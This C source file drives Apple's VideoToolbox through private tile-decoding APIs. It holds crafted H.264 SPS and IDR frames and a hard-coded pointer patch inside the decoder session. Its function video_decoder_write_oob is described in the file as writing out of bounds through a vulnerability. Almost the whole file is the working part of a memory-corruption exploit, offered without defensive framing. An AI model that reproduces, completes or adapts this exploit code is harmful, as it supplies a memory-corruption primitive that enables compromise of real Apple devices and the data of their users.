#include <VideoToolbox/VideoToolbox.h>
#include "video_decoder.h"
#include "log.h"
#include "utils.h"

#include <CoreVideo/CVPixelBuffer.h>

#define NAL_START_CODE_SIZE											(4)

const uint8_t g_idr_frame[] = {
	0x00, 0x00, 0x00, 0xcd, 0x25, 0xb8, 0x20, 0x1f, 0xde, 0x08, 0xe5, 0xf1, 0x09, 0x01, 0xff, 0x03, 0xb0, 0xfa,
	0xd9, 0xde, 0x86, 0x89, 0x63, 0x4c, 0xca, 0xc1, 0x43, 0xcd, 0x0e, 0x80, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03,
	0x00, 0x00, 0x03, 0x00, 0x00, 0x2b, 0x04, 0xb1, 0x6a, 0x4f, 0x54, 0x40, 0x5e, 0x8d, 0xa0, 0x00, 0x00, 0x03, 
	0x00, 0x00, 0x18, 0xb0, 0x00, 0x40, 0xc0, 0x00, 0xae, 0x80, 0x02, 0x36, 0x00, 0x09, 0xd0, 0x00, 0x36, 0x00, 
	0x01, 0x1c, 0x00, 0x05, 0xf0, 0x00, 0x2f, 0x00, 0x01, 0x10, 0x00, 0x08, 0x80, 0x00, 0x00, 0x03, 0x00, 0x00, 
	0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 
	0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 
	0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 
	0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 
	0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 
	0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 
	0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x20, 0x20
};

const uint8_t g_valid_sps_frame[] = {
	/*0x00, 0x00, 0x00, 0x10, */0x27, 0x64, 0x00, 0x34, 0xac, 0x56, 0x80, 0x50, 0x05, 0xba, 0x6e, 0x04, 0x04, 0x05, 
	0x48, 0x10
};

const uint8_t g_bad_sps_frame[] = {
	0x00, 0x00, 0x00, 0x10, 0x27, 0x64, 0x00, 0x34, 0xec, 0x56, 0x80, 0x50, 0x05, 0xba, 0x6e, 0x04, 0x04, 0x05, 
	0x48, 0x10
};

const uint8_t g_pps_frame[] = {
	/*0x00, 0x00, 0x00, 0x04, */0x28, 0xee, 0x3c, 0xb0
};

const uint8_t g_sei_frame[] = {
	0x00, 0x00, 0x00, 0x29, 0x06, 0x05, 0x23, 0x47, 0x56, 0x4a, 0xdc, 0x5c, 0x4c, 0x43, 0x3f, 0x94, 0xef, 0xc5, 
	0x11, 0x3c, 0xd1, 0x43, 0xa8, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00, 0x02, 0x8f, 0x5c, 0x28, 0x01, 0xff, 
	0xcc, 0xcc, 0xff, 0x02, 0x00, 0x4c, 0x4b, 0x40, 0x80
};

OSStatus
VTTileDecompressionSessionCreate(
		CM_NULLABLE CFAllocatorRef                              allocator,
		CM_NONNULL CMVideoFormatDescriptionRef					videoFormatDescription,
		CM_NULLABLE CFDictionaryRef								videoDecoderSpecification,
		CM_NULLABLE CFDictionaryRef                             destinationImageBufferAttributes,
		const VTDecompressionOutputCallbackRecord * CM_NULLABLE outputCallback,
		CM_RETURNS_RETAINED_PARAMETER CM_NULLABLE VTDecompressionSessionRef * CM_NONNULL decompressionSessionOut);

OSStatus
VTTileDecompressionSessionDecodeTile(
		CM_NONNULL VTDecompressionSessionRef	session,
		CM_NONNULL CMSampleBufferRef			sampleBuffer,
		VTDecodeFrameFlags						decodeFlags, // bit 0 is enableAsynchronousDecompression
		void * CM_NULLABLE						sourceFrameRefCon,
		CVPixelBufferRef						iosurface_buffer,
		uint64_t	        					x_and_y,
		void * CM_NULLABLE						some_flag,
		VTDecodeInfoFlags * CM_NULLABLE 		infoFlagsOut) API_AVAILABLE(macosx(10.8), ios(8.0), tvos(10.2));


OSStatus video_decoder_create_decompression_session(CM_NULLABLE CFAllocatorRef                              allocator,
        CM_NONNULL CMVideoFormatDescriptionRef					videoFormatDescription,
        CM_NULLABLE CFDictionaryRef								videoDecoderSpecification,
        CM_NULLABLE CFDictionaryRef                             destinationImageBufferAttributes,
        const VTDecompressionOutputCallbackRecord * CM_NULLABLE outputCallback,
        CM_RETURNS_RETAINED_PARAMETER CM_NULLABLE VTDecompressionSessionRef * CM_NONNULL decompressionSessionOut) {
    return VTTileDecompressionSessionCreate(allocator, videoFormatDescription, videoDecoderSpecification,
            destinationImageBufferAttributes, outputCallback, decompressionSessionOut);
}

OSStatus video_decoder_do_decode(CM_NONNULL VTDecompressionSessionRef	session,
        CM_NONNULL CMSampleBufferRef			sampleBuffer,
        VTDecodeFrameFlags						decodeFlags, // bit 0 is enableAsynchronousDecompression
        void * CM_NULLABLE						sourceFrameRefCon,
        CVPixelBufferRef						iosurface_buffer,
        uint64_t	        					x_and_y,
        void * CM_NULLABLE						some_flag,
        VTDecodeInfoFlags * CM_NULLABLE 		infoFlagsOut) {
    return VTTileDecompressionSessionDecodeTile(session, sampleBuffer, decodeFlags, sourceFrameRefCon,
            iosurface_buffer, x_and_y, some_flag, infoFlagsOut);
}

static void on_decompress( void __unused *decompressionOutputRefCon, void *sourceFrameRefCon, OSStatus status, VTDecodeInfoFlags infoFlags, CVImageBufferRef pixelBuffer, CMTime presentationTimeStamp, CMTime presentationDuration ){
	#pragma unused(decompressionOutputRefCon)
	#pragma unused(sourceFrameRefCon)
	#pragma unused(status)
	#pragma unused(infoFlags)
	#pragma unused(pixelBuffer)
	#pragma unused(presentationTimeStamp)
	#pragma unused(presentationDuration)

}


/*
 * Function name: 	video_decoder_create_video_format_description
 * Description:		Creates a video format.
 * Returns:			OSStatus and a video format description as an output param.
 */

static
OSStatus video_decoder_create_video_format_description(CMVideoFormatDescriptionRef * video_format_description) {
	
	OSStatus ret = 0;

	const uint8_t * const params[2] = {
		g_valid_sps_frame,
		g_pps_frame
	};

	const size_t sizes[2] = {
		sizeof(g_valid_sps_frame),//sizeof(g_valid_sps_frame) - NAL_START_CODE_SIZE,
		sizeof(g_pps_frame),//sizeof(g_pps_frame) - NAL_START_CODE_SIZE
	};

	ret = CMVideoFormatDescriptionCreateFromH264ParameterSets(NULL,
		2,
		params,
		sizes,
		4,
		video_format_description);

	return ret;
}

/*
 * Function name: 	video_decoder_cleanup_session
 * Description:		Cleans up the session object.
 * Returns:			void.
 */

void video_decoder_cleanup_session(decoding_session_t * session) {

	if (session->decoder_session)
	{
		VTDecompressionSessionInvalidate(session->decoder_session);
		release_CF_object(session->decoder_session);
	}

	if (session->video_description)
	{
		release_CF_object(session->video_description);
	}
}


/*
 * Function name: 	video_decoder_create_session_property_dictionary
 * Description:		Creates a property dictionary for the decoding session.
 * Returns:			int - 0 for success and the dictionary as an output param.
 */

static
int video_decoder_create_session_property_dictionary(CFDictionaryRef * properties) {
	
	int ret = 0;
	CFDictionaryRef attrs = NULL;
	const void * keys[] = { kCVPixelBufferPixelFormatTypeKey };
	const void * values[1] = { NULL };

	CFNumberRef pixel_format_type_value = 0;
	int pixel_format_type_value_int = kCVPixelFormatType_420YpCbCr8Planar;

	pixel_format_type_value = CFNumberCreate(NULL, kCFNumberSInt32Type, &pixel_format_type_value_int);
	if (NULL == pixel_format_type_value)
	{
		ERROR_LOG("Error creating CFNumber pixel format type value");
		ret = -1;
		goto cleanup;
	}

	values[0] = (void*)pixel_format_type_value;

	attrs = CFDictionaryCreate(NULL, keys, values, 1, NULL, NULL);
	if (NULL == attrs)
	{
		ERROR_LOG("Error creating an attribute dictionary");
		ret = -1;
		goto cleanup;
	}

	release_CF_object(pixel_format_type_value);

	*properties = attrs;

cleanup:
	return ret != 0;
}




/*
 * Function name: 	video_decoder_create_session
 * Description:		Creates a new video decoding session.
 * Returns:			OSStatus and a decoding_session_t as an output param.
 */

OSStatus video_decoder_create_session(decoding_session_t * session) {
	
	OSStatus ret = 0;
	CMVideoFormatDescriptionRef format_description = NULL;
	VTDecompressionSessionRef decoder_session = NULL;

	int decoder_usage_int = 0x28;
	CFNumberRef decoder_usage = NULL;

	CFDictionaryRef attrs = 0;

	VTDecompressionOutputCallbackRecord callBack_record;
	callBack_record.decompressionOutputCallback = on_decompress;
	callBack_record.decompressionOutputRefCon = NULL;

	if (NULL == session)
	{
		ERROR_LOG("No session pointer");
		ret = -1;
		goto cleanup;
	}

	ret = video_decoder_create_video_format_description(&format_description);
	if (noErr != ret)
	{
		ERROR_LOG("Error creating format description");
		goto cleanup;
	}

	ret = video_decoder_create_session_property_dictionary(&attrs);
	if (ret)
	{
		ERROR_LOG("Error creating properties for the decoding session");
		goto cleanup;
	}

	ret = video_decoder_create_decompression_session(NULL,
		format_description,
		NULL,
		attrs,
		&callBack_record,
		&decoder_session);

	if (noErr != ret)
	{
		ERROR_LOG("Error creating a decompression session object: %d", (int)ret);
		goto cleanup;
	}

	void * temp_hack_wtf = *(void**)((char*)decoder_session + 0xA0);
	*(void**)(temp_hack_wtf + 0xC0) = 0;

	decoder_usage = CFNumberCreate(NULL, kCFNumberSInt32Type, &decoder_usage_int);
	if (NULL == decoder_usage)
	{
		ERROR_LOG("Error creating CFNumber decoder usage");
		ret = -1;
		goto cleanup;
	}

	VTSessionSetProperty(decoder_session, CFSTR("DecoderUsage"), decoder_usage);

	release_CF_object(decoder_usage);

	session->video_description = format_description;
	session->decoder_session = decoder_session;

cleanup:
	if (ret)
	{
		if (decoder_session)
		{
			release_CF_object(decoder_session);
		}

		if (attrs)
		{
			release_CF_object(attrs);
		}

		if (format_description)
		{
			release_CF_object(format_description);
		}
	}
	return ret;
}

/*
 * Function name: 	video_decoder_decode
 * Description:		Attempts to decode a frame. 
 *					The caller can optionally supply an "attachments" dictionary for the frame.
 *					For more information please read the manual, or reverse engineer.
 * Returns:			OSStatus.
 */

static
OSStatus video_decoder_decode(decoding_session_t * session, void * buffer, size_t buffer_size, 
	uint32_t surface_id, int offset) {
	
	OSStatus ret = noErr;
	CMBlockBufferRef block_buffer = NULL;
	CMSampleBufferRef sample_buffer = NULL;
	CVPixelBufferRef pixel_buffer_output = NULL;
	VTDecodeFrameFlags input_flags = 0;
	VTDecodeInfoFlags output_flags = 0;
	const size_t sample_size_array[] = { buffer_size };

	CVPixelBufferRef pixel_with_surface = NULL;
	IOSurfaceRef surface = IOSurfaceLookup(surface_id);
	if (NULL == surface)
	{
		ERROR_LOG("Error getting IOSurface id %d", surface_id);
		goto cleanup;
	}

	ret = CVPixelBufferCreateWithIOSurface(NULL, surface, NULL, &pixel_with_surface);
    //ret = CVPixelBufferCreate(NULL, 100, 100, kCMPixelFormat_32ARGB, NULL, &pixel_with_surface);
    if (ret)
    {
        ERROR_LOG("Error creating pixel buffer");
        goto cleanup;
    }

	ret = CMBlockBufferCreateWithMemoryBlock(NULL,
		buffer, buffer_size, NULL, NULL, 0, buffer_size, 0, &block_buffer);

	if (ret != kCMBlockBufferNoErr)
	{
		ERROR_LOG("Error allocating CMBlockBuffer");
		goto cleanup;
	}

	ret = CMSampleBufferCreateReady(NULL,
		block_buffer,
		session->video_description,
		1, 0, NULL, 1, sample_size_array,
		&sample_buffer);

	if (noErr != ret)
	{
		ERROR_LOG("Error allocating CMSampleBuffer");
		goto cleanup;
	}

	ret = video_decoder_do_decode(session->decoder_session, sample_buffer, input_flags, &pixel_buffer_output,
			pixel_with_surface, (uint64_t)offset, NULL, &output_flags);

cleanup:

	if (pixel_buffer_output)
	{
		release_CF_object(pixel_buffer_output);
	}

	/*
	if (sample_buffer)
	{
		release_CF_object(sample_buffer);
	}*/

/*
	if (block_buffer)
	{
		release_CF_object(block_buffer);
	}
*/

	return ret;
}

/*
 * Function name: 	video_decoder_write_oob
 * Description:		Writes out of bounds using a vulnerability.
 * Returns:			OSStatus but there's no good way to know whether we succeeded (yet).
 */

OSStatus video_decoder_write_oob(decoding_session_t * session, int offset_to_write, uint32_t surface_id) {
	
	OSStatus ret = noErr;
	int offset_y_val = 373475417;
	CFBooleanRef last_tile = kCFBooleanFalse;

	void * sps_frame = (void*)g_bad_sps_frame;
	void * idr_frame = (void*)g_idr_frame;

	ret = video_decoder_decode(session, sps_frame, sizeof(g_bad_sps_frame), surface_id, offset_to_write);
	if (-12911 != ret)
	{
		ERROR_LOG("Something went wrong with sending our bad SPS frame %d", (int)ret);
		//goto cleanup;
	}

	DEBUG_LOG("just sent SPS frame");

	ret = video_decoder_decode(session, idr_frame, sizeof(g_idr_frame), surface_id, offset_to_write);
	if (noErr != ret)
	{
		ERROR_LOG("Something went wrong with sending our IDR frame");
		//goto cleanup;
	}

	DEBUG_LOG("just sent IDR frame again");


cleanup:
	return ret;
}




